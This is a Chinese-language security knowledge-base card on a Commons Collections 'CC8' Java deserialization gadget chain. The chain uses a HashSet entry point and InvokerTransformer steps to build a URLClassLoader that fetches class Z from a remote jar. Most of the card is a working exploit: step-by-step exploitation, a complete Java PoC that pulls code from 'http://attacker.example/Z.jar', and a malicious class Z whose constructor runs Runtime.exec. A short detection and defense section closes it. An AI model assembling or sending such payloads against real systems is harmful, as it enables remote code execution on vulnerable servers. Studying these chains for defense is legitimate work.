---
id: web-java-deser-cc8-hashset-urlclassloader-remote-class
title: CC8 变体：HashSet.hashCode 入口 + InvokerTransformer 构造 URLClassLoader 远程加载类 Z
type: scenario
domain: web
path: web/java/deserialization
technique: cc8-hashset-urlclassloader-remote-class
tags:
- java
- deserialization
- gadget
- commons-collections
- cc8
- hashset
- urlclassloader
- remote-classloading
- invokertransformer
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V301
  verified_at: '2026-11-08T12:06:52+08:00'
  notes: 已对照原文与 2 张图核对：原文 PoC 为 ysoserial CommonsCollections8（图01 入口汇总含 CC6 HashSet/HashMap→TiedMapEntry.hashCode→LazyMap.get；图02 ReflectionFactory 佐证其它 Factory 不可用）。卡片链与 PoC 一致：HashSet.readObject→HashMap.put→TiedMapEntry.hashCode→getValue→LazyMap.get→ChainedTransformer；InvokerTransformer 依次 ConstantTransformer(URLClassLoader.class)→getConstructor(URL[].class)→newInstance(new URL(url))→loadClass("Z")→getConstructor(String.class)→newInstance(command)，反射改 HashSet.map 内部 HashMap.table 节点 key；恶意 jar 类 Z(String) 构造器执行。与 cc6-hashmap-hashset-invokertransformer 同入口不同 sink（该卡 Runtime.exec、本卡 URLClassLoader 远程类加载），force 新增成立；affected_versions 原文仅 @Dependencies 3.1，未设版本字段。未验证点：未执行 PoC，原文未实际外连 jar。
url: /docs/web/java/deserialization/web-java-deser-cc8-hashset-urlclassloader-remote-class/
draft: false
kb_aliases:
- CC8
- HashSet 反序列化入口
- URLClassLoader 远程加载
- loadClass Z
- 远程 jar 反序列化链
- TiedMapEntry hashCode
---

## 一句话结论

在 Commons Collections 3.1/3.2.1 且目标可通过 `URLClassLoader` 加载远程或本地 jar 的环境中，把 `TiedMapEntry` 反射放进 `HashSet` 的内部 `HashMap` 节点作为 key，反序列化时 `HashSet.readObject → HashMap.put → TiedMapEntry.hashCode → LazyMap.get → ChainedTransformer`；Transformer 序列用 `InvokerTransformer` 依次构造 `URLClassLoader`、调用 `loadClass("Z")`、取 `String` 构造器并 `newInstance(command)`，最终执行远程 jar 中类 `Z` 的构造器，形成不依赖 `Runtime.exec` 的 RCE 链。

## 原理

- **入口**：`HashSet.readObject()` 读取元素后调用内部 `HashMap.put(e, PRESENT)`，`HashMap.hash(key)` 调用 `key.hashCode()`；若 key 是 `TiedMapEntry`，其 `hashCode()` 调用 `getValue()`，而 `getValue()` 是 `map.get(key)`；把 `map` 设为 `LazyMap` 且 key 不存在时，`LazyMap.get` 调用 `factory.transform(key)`，进入 `ChainedTransformer`。
- **构造期的 key 替换**：`HashSet.add` 会提前触发哈希链，因此先 `add("foo")` 放入一个无害元素，再反射取 `HashSet.map`（部分 JDK 为 `backingMap`）与 `HashMap.table`（部分 JDK 为 `elementData`），从数组 `[0]`/`[1]` 取 `HashMap$Node`，反射把 `node.key` 改写为构造好的 `TiedMapEntry`，从而在不触发链的情况下完成 payload 装配。
- **Transformer 序列**：
  1. `ConstantTransformer(URLClassLoader.class)` 提供初始对象；
  2. `InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{URL[].class}})` 取 `URLClassLoader(URL[])` 构造器；
  3. `InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{new URL[]{url}}})` 创建 URLClassLoader；
  4. `InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{"Z"})` 从远程 jar 加载类 `Z`；
  5. `InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}})` 取 `Z(String)` 构造器；
  6. `InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new String[]{command}})` 实例化 `Z`，其构造器执行命令；
  7. `ConstantTransformer(1)` 收尾。
- **与 Runtime.exec 链的区别**：sink 不是 `Runtime.exec`，而是“远程类加载 + 构造器执行”。目标只要能访问攻击者 jar（HTTP/HTTPS 或 `file:`），就能加载任意类；即使 `Runtime` 反射被策略/白名单阻断，只要 `URLClassLoader` 可用仍可执行。代价是需要额外托管 jar 且目标可出网/可读文件。
- **类加载细节**：`URLClassLoader.loadClass("Z")` 触发下载并定义 `Z`；`getConstructor(String.class).newInstance(command)` 执行 `Z` 的公有构造器，命令作为构造参数传入，避免在序列化流中出现明文字符串命令。

## 触发条件

- Commons Collections 3.1/3.2.1（`InvokerTransformer`、`ChainedTransformer`、`LazyMap`、`TiedMapEntry` 可序列化且未被过滤）；
- 目标存在 Java 原生反序列化入口，且未封禁 `HashSet`、`HashMap`、`TiedMapEntry`、`LazyMap`、`ChainedTransformer`、`InvokerTransformer`、`URLClassLoader`；
- 目标可访问攻击者 jar（HTTP/HTTPS 或本地文件路径），且 JDK 允许 `URLClassLoader` 从该 URL 加载类（无 SecurityManager 阻断）；
- 攻击者 jar 中存在公有类 `Z`，其 `Z(String)` 构造器执行传入命令；
- 构造端能反射访问 `HashSet`/`HashMap` 内部字段。

## 利用步骤

1. 编写并打包恶意 jar：类 `Z` 提供 `public Z(String cmd)`，构造器内执行 `Runtime.getRuntime().exec(cmd)`；部署到目标可达的 URL（或本地路径）。
2. 按上述顺序构造 `Transformer[]`，用 `new ChainedTransformer(transformers)` 包装。
3. `LazyMap.decorate(new HashMap(), chain)` 建 LazyMap，`new TiedMapEntry(lazyMap, "foo")` 作为待注入 key。
4. `HashSet set = new HashSet(1); set.add("foo");` 反射取内部 `HashMap` 与 table/elementData，取节点并反射把 `node.key` 改为 `TiedMapEntry`。
5. 序列化 `set`，通过反序列化入口发送；目标反序列化时 `HashSet.readObject → HashMap.put → hashCode → LazyMap.get → ChainedTransformer` 完成远程类加载与命令执行。
6. 若目标不出网，可尝试 `file:` URL 指向目标本地可写/可读的 jar；否则换用 `TemplatesImpl` 等本地 sink。

## PoC

```java
String url = "http://attacker.example/Z.jar";
String command = "whoami";

Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(URLClassLoader.class),
    new InvokerTransformer("getConstructor", new Class[]{Class[].class},
            new Object[]{new Class[]{URL[].class}}),
    new InvokerTransformer("newInstance", new Class[]{Object[].class},
            new Object[]{new Object[]{new URL[]{new URL(url)}}}),
    new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{"Z"}),
    new InvokerTransformer("getConstructor", new Class[]{Class[].class},
            new Object[]{new Class[]{String.class}}),
    new InvokerTransformer("newInstance", new Class[]{Object[].class},
            new Object[]{new String[]{command}}),
    new ConstantTransformer(1)
};
Transformer chain = new ChainedTransformer(transformers);
Map lazy = LazyMap.decorate(new HashMap(), chain);
TiedMapEntry entry = new TiedMapEntry(lazy, "foo");

HashSet set = new HashSet(1);
set.add("foo");
Field mapField = HashSet.class.getDeclaredField("map"); // 旧 JDK 为 backingMap
mapField.setAccessible(true);
HashMap inner = (HashMap) mapField.get(set);
Field tableField = HashMap.class.getDeclaredField("table"); // 旧 JDK 为 elementData
tableField.setAccessible(true);
Object[] table = (Object[]) tableField.get(inner);
Object node = table[0] != null ? table[0] : table[1];
Field keyField = node.getClass().getDeclaredField("key");
keyField.setAccessible(true);
keyField.set(node, entry);
// serialize(set)
```

配套恶意 jar 类：

```java
public class Z {
    public Z(String cmd) throws Exception {
        Runtime.getRuntime().exec(cmd);
    }
}
```

## 变体与关联

- **关联**：`web-java-deser-commonscollections-cc6-hashmap-hashset-invokertransformer` 使用同一 `HashSet → TiedMapEntry.hashCode → LazyMap.get` 入口，但 sink 是 `InvokerTransformer` 直接调 `Runtime.exec`；本卡把 sink 换成 `URLClassLoader` 远程类加载，属于同入口不同 sink 的变体。
- **同类**：`web-java-deser-commonscollections-cc7-hashtable-equals-lazymap`（Hashtable equals 入口）、`web-java-deser-commonscollections-cc5-badattribute-tostring`（BadAttributeValueExpException 入口）；classpath 为 commons-collections4 时可参考 `web-java-deserialization-cookie-userinfo-cc8-springecho` 的 CC8/TemplatesImpl 用法。
- **边界**：需要目标能够加载远程/本地 jar；若 `URLClassLoader` 被过滤或网络不可达则失效；本卡不适用于仅靠内存字节码（无文件）的场景，后者应使用 `TemplatesImpl` 链。

## 检测与防御

- **检测**：反序列化流中出现 `URLClassLoader`、`InvokerTransformer("loadClass")` 或 `getConstructor/newInstance` 组合；Java 进程在反序列化后发起异常 HTTP 请求下载 jar；`URLClassLoader` 加载非业务路径的类。
- **防御**：使用类白名单或 JEP 290 `ObjectInputFilter`；封禁 `InvokerTransformer`/`ChainedTransformer`/`LazyMap`/`TiedMapEntry`；升级 Commons Collections 至 3.2.2+；禁止业务进程访问非受信 jar/远程 codebase；限制出站 HTTP 与 `file:` 读取。
- **检测规则**：对反序列化入口记录被解析类名，命中 `org.apache.commons.collections.functors.*` 即告警；结合 EDR 监控 `URLClassLoader` 创建与远程 jar 落盘。
